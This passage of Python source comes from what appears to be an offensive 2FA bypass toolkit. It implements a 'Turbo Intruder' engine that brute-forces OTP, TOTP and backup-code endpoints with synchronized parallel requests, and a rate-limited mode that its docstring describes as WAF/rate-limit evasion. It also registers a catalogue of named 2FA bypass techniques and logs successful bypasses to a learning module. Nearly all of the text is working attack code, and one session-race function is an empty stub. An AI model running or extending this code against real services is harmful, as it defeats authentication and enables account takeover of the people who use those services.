                                  payloads: List[Dict]) -> List[TurboResponse]:
        """Execute multi-phase synchronized attack."""
        # Phase 1: Prepare all requests
        # Phase 2: Send in synchronized bursts
        # Phase 3: Collect and analyze
        # For OTP race conditions, we might hit multiple endpoints
        return await self._connection_pool_attack(session, payloads)
    
    async def _rate_limited_attack(self, session: aiohttp.ClientSession,
                                    payloads: List[Dict]) -> List[TurboResponse]:
        """Execute rate-limited attack for WAF/rate-limit evasion."""
        responses = []
        interval = 1.0 / self.config.requests_per_second if self.config.requests_per_second > 0 else 0
        
        for i, payload in enumerate(payloads):
            method, url, headers, body = self.request_template.render(payload)
            result = await self._send_single_request(session, method, url, headers, body, i, payload)
            responses.append(result)
            self._emit("on_progress", i + 1, len(payloads))
            
            if interval > 0 and i < len(payloads) - 1:
                await asyncio.sleep(interval)
                
        return responses
    
    async def run_attack(self, request_template: TurboRequest) -> List[TurboResponse]:
        """Execute the attack with the configured mode."""
        self.request_template = request_template
        self.running = True
        self.stats = {"sent": 0, "received": 0, "errors": 0, "candidates": 0, 
                      "start_time": time.time(), "end_time": 0, "latencies": []}
        
        payloads = self._generate_payloads()
        self.stats["sent"] = len(payloads)
        
        logger.info(f"Starting Turbo Intruder attack: {self.config.mode.value} "
                   f"with {len(payloads)} payloads")
        
        async with self._create_session() as session:
            if self.config.mode == AttackMode.SINGLE_PACKET:
                responses = await self._single_packet_attack(session, payloads)
            elif self.config.mode == AttackMode.LAST_BYTE_SYNC:
                responses = await self._last_byte_sync_attack(session, payloads)
            elif self.config.mode == AttackMode.CONNECTION_POOL:
                responses = await self._connection_pool_attack(session, payloads)
            elif self.config.mode == AttackMode.RATE_LIMITED:
                responses = await self._rate_limited_attack(session, payloads)
            elif self.config.mode == AttackMode.HTTP2_MULTIPLEX:
                responses = await self._connection_pool_attack(session, payloads)
            elif self.config.mode == AttackMode.PHASE_SYNC:
                responses = await self._phase_sync_attack(session, payloads)
            else:
                responses = await self._connection_pool_attack(session, payloads)
        
        self.stats["end_time"] = time.time()
        self.results = responses
        self.candidates = [r for r in responses if r.is_candidate]
        self.stats["candidates"] = len(self.candidates)
        
        # Record learning for successful techniques
        if self.candidates:
            from mitmpro import ai_learn
            for c in self.candidates:
                ai_learn.learn_otp_bypass(
                    technique=f"turbo_intruder_{self.config.mode.value}",
                    target_url=self.config.target_url,
                    target_type="otp_bypass",
                    success_details={
                        "payload": c.payload_used,
                        "status_code": c.status_code,
                        "latency_ms": c.latency_ms,
                        "indicators": c.success_indicators
                    }
                )
        
        self._emit("on_complete", self.get_results_summary())
        self.running = False
        
        return responses
    
    def get_results_summary(self) -> Dict:
        """Get attack results summary."""
        duration = self.stats["end_time"] - self.stats["start_time"]
        latencies = self.stats["latencies"]
        
        return {
            "mode": self.config.mode.value,
            "total_payloads": self.stats["sent"],
            "completed": self.stats["received"],
            "errors": self.stats["errors"],
            "candidates_found": self.stats["candidates"],
            "duration_seconds": round(duration, 2),
            "requests_per_second": round(self.stats["received"] / max(duration, 0.001), 2),
            "avg_latency_ms": round(sum(latencies) / len(latencies), 2) if latencies else 0,
            "min_latency_ms": round(min(latencies), 2) if latencies else 0,
            "max_latency_ms": round(max(latencies), 2) if latencies else 0,
            "candidates": [
                {
                    "request_id": c.request_id,
                    "payload": c.payload_used,
                    "status_code": c.status_code,
                    "latency_ms": round(c.latency_ms, 2),
                    "indicators": c.success_indicators
                }
                for c in self.candidates[:50]  # Top 50
            ]
        }
    
    def get_all_results(self) -> List[Dict]:
        """Get all results as dict list."""
        return [
            {
                "request_id": r.request_id,
                "payload": r.payload_used,
                "status_code": r.status_code,
                "latency_ms": round(r.latency_ms, 2),
                "body_preview": r.body[:200] if r.body else "",
                "is_candidate": r.is_candidate,
                "indicators": r.success_indicators,
                "error": r.error
            }
            for r in self.results
        ]


# =============================================================================
# HIGH-LEVEL API FUNCTIONS
# =============================================================================

def turbo_intruder_otp_race(target_url: str, session, otp_endpoint: str,
                             method: str = "POST", otp_param: str = "otp",
                             attack_mode: str = "connection_pool",
                             max_concurrent: int = 100,
                             common_otps: List[str] = None) -> Dict:
    """
    Execute Turbo Intruder race condition attack on OTP endpoint.
    
    Args:
        target_url: Base URL of target application
        session: requests.Session object with cookies/auth
        otp_endpoint: OTP validation endpoint path
        method: HTTP method (POST/GET)
        otp_param: Parameter name for OTP value
        attack_mode: Attack mode (single_packet, connection_pool, rate_limited, etc.)
        max_concurrent: Maximum concurrent requests
        common_otps: List of common OTP values to test
        
    Returns:
        Attack results with candidates and statistics
    """
    # Extract headers and cookies from session
    headers = dict(session.headers)
    cookies = session.cookies.get_dict()
    if cookies:
        headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in cookies.items()])
    
    # Build request template with §otp§ marker.
    # For GET the variant must live in the URL query string (the body is empty),
    # so the marker is placed there and rendered into the URL by TurboRequest.render.
    if method == "GET":
        sep = "&" if "?" in otp_endpoint else "?"
        url = f"{target_url.rstrip('/')}/{otp_endpoint.lstrip('/')}{sep}{otp_param}=§otp§"
        template_body = ""
    else:
        url = f"{target_url.rstrip('/')}/{otp_endpoint.lstrip('/')}"
        template_body = json.dumps({otp_param: "§otp§"})

    request = TurboRequest(
        method=method,
        url=url,
        headers=headers,
        body=template_body,
        payload_markers=["otp"]
    )
    
    # Configure attack
    mode_map = {
        "single_packet": AttackMode.SINGLE_PACKET,
        "last_byte_sync": AttackMode.LAST_BYTE_SYNC,
        "connection_pool": AttackMode.CONNECTION_POOL,
        "rate_limited": AttackMode.RATE_LIMITED,
        "http2_multiplex": AttackMode.HTTP2_MULTIPLEX,
        "phase_sync": AttackMode.PHASE_SYNC
    }
    
    config = AttackConfig(
        mode=mode_map.get(attack_mode, AttackMode.CONNECTION_POOL),
        max_concurrent=max_concurrent,
        target_url=target_url,
        otp_scheme=OTPScheme.STATIC_6_DIGIT,
        wordlist=common_otps or OTPPayloadGenerator.generate_common_otps()
    )
    
    engine = TurboIntruderEngine(config)
    
    # Run async attack
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        results = loop.run_until_complete(engine.run_attack(request))
        summary = engine.get_results_summary()
        return summary
    finally:
        loop.close()


def turbo_intruder_multi_endpoint_race(target_url: str, session,
                                        endpoints: List[Dict],
                                        attack_mode: str = "phase_sync",
                                        max_concurrent: int = 50) -> Dict:
    """
    Execute coordinated race condition across multiple endpoints.
    
    Args:
        target_url: Base URL
        session: requests.Session
        endpoints: List of dicts with {path, method, otp_param, payload_key}
        attack_mode: Attack mode
        max_concurrent: Max concurrent per endpoint
        
    Returns:
        Combined results from all endpoints
    """
    results = {}
    
    for ep in endpoints:
        ep_name = ep.get("name", ep["path"])
        print(f"[*] Turbo Intruder: attacking {ep_name}...")
        
        result = turbo_intruder_otp_race(
            target_url=target_url,
            session=session,
            otp_endpoint=ep["path"],
            method=ep.get("method", "POST"),
            otp_param=ep.get("otp_param", "otp"),
            attack_mode=attack_mode,
            max_concurrent=max_concurrent
        )
        results[ep_name] = result
        
    return results


def turbo_intruder_totp_race(target_url: str, session,
                              totp_secret: str,
                              time_window: int = 30,
                              lookback: int = 10,
                              lookahead: int = 10) -> Dict:
    """
    Execute race condition attack against TOTP validation.
    
    Tests multiple time windows simultaneously to exploit timing validation.
    """
    candidates = OTPPayloadGenerator.generate_totp_candidates(
        totp_secret, time_window, lookback, lookahead
    )
    
    return turbo_intruder_otp_race(
        target_url=target_url,
        session=session,
        otp_endpoint="/validate_totp",
        common_otps=candidates,
        attack_mode="connection_pool",
        max_concurrent=len(candidates)
    )


def turbo_intruder_backup_code_brute(target_url: str, session,
                                      max_attempts: int = 1000) -> Dict:
    """
    Brute-force backup/recovery codes with race condition.
    """
    return turbo_intruder_otp_race(
        target_url=target_url,
        session=session,
        otp_endpoint="/validate_backup_code",
        otp_param="backup_code",
        common_otps=OTPPayloadGenerator.generate_backup_codes(max_attempts),
        attack_mode="connection_pool",
        max_concurrent=100
    )


def turbo_intruder_session_race(target_url: str, attacker_session,
                                 victim_session, otp_endpoint: str) -> Dict:
    """
    Race condition: complete OTP on attacker account, race to use session on victim.
    """
    # First complete OTP legitimately on attacker account
    # Then race to use the authenticated session on victim endpoint
    pass  # Implementation requires two coordinated sessions


# =============================================================================
# INTEGRATION WITH EXISTING OTP BYPASS ENGINE
# =============================================================================

def get_turbo_intruder_techniques():
    """Return Turbo Intruder techniques for integration with existing OTP module."""
    return {
        "turbo_intruder_otp_race": {
            "name": "Turbo Intruder OTP Race Condition",
            "description": "High-performance parallel OTP brute-force with race condition exploitation",
            "function": turbo_intruder_otp_race,
            "params": ["target_url", "session", "otp_endpoint", "method", "otp_param", "attack_mode", "max_concurrent"],
            "category": "race_condition"
        },
        "turbo_intruder_multi_endpoint": {
            "name": "Turbo Intruder Multi-Endpoint Race",
            "description": "Coordinated race attacks across multiple OTP endpoints simultaneously",
            "function": turbo_intruder_multi_endpoint_race,
            "params": ["target_url", "session", "endpoints", "attack_mode", "max_concurrent"],
            "category": "race_condition"
        },
        "turbo_intruder_totp_race": {
            "name": "Turbo Intruder TOTP Time Window Race",
            "description": "Exploit TOTP validation timing by testing adjacent time windows in parallel",
            "function": turbo_intruder_totp_race,
            "params": ["target_url", "session", "totp_secret", "time_window", "lookback", "lookahead"],
            "category": "race_condition"
        },
        "turbo_intruder_backup_codes": {
            "name": "Turbo Intruder Backup Code Brute-Force",
            "description": "High-speed backup/recovery code brute-force with race condition optimization",
            "function": turbo_intruder_backup_code_brute,
            "params": ["target_url", "session", "max_attempts"],
            "category": "race_condition"
        }
    }


# Add Turbo Intruder techniques to the main technique registry
_TURBO_TECHNIQUES = get_turbo_intruder_techniques()


def get_all_techniques():
    """Return all available OTP bypass techniques including Turbo Intruder."""
    techniques = {
        "response_manipulation_registration": response_manipulation_registration,
        "race_condition_otp_bruteforce": race_condition_otp_bruteforce,
        "response_manipulation_login": response_manipulation_login,
        "status_code_manipulation": status_code_manipulation,
        "direct_endpoint_access": direct_endpoint_access,
        "referer_header_bypass": referer_header_bypass,
        "x_forwarded_for_bypass": x_forwarded_for_bypass,
        "session_manipulation_attack": session_manipulation_attack,
        "backup_code_abuse": backup_code_abuse,
        "clickjacking_2fa_disable": clickjacking_2fa_disable,
        "developer_console_exploit": developer_console_exploit,
        "csrf_2fa_bypass": csrf_2fa_bypass,
        "password_reset_2fa_bypass": password_reset_2fa_bypass,
        "token_in_response_exploit": token_in_response_exploit,
        "sequential_otp_prediction": sequential_otp_prediction,
        "no_rate_limiting_exploit": no_rate_limiting_exploit,
        "refer_check_bypass": refer_check_bypass,
        "developer_tools_exploit": developer_tools_exploit,
        "x_forwarded_host_injection": x_forwarded_host_injection
    }
    
    # Add Turbo Intruder techniques
    for name, info in _TURBO_TECHNIQUES.items():
        techniques[name] = info["function"]
        
    return techniques


def run_technique(technique_name, target_url, session, **kwargs):
    """Run a specific OTP bypass technique including Turbo Intruder."""
    techniques = get_all_techniques()

    if technique_name in techniques:
        import inspect
        fn = techniques[technique_name]
        sig = inspect.signature(fn)
        accepted = {
            k: v for k, v in kwargs.items()
            if k in sig.parameters and sig.parameters[k].kind
            in (inspect.Parameter.POSITIONAL_OR_KEYWORD, inspect.Parameter.KEYWORD_ONLY)
        }
        return fn(target_url, session, **accepted)

    return False, f"Technique {technique_name} not found"
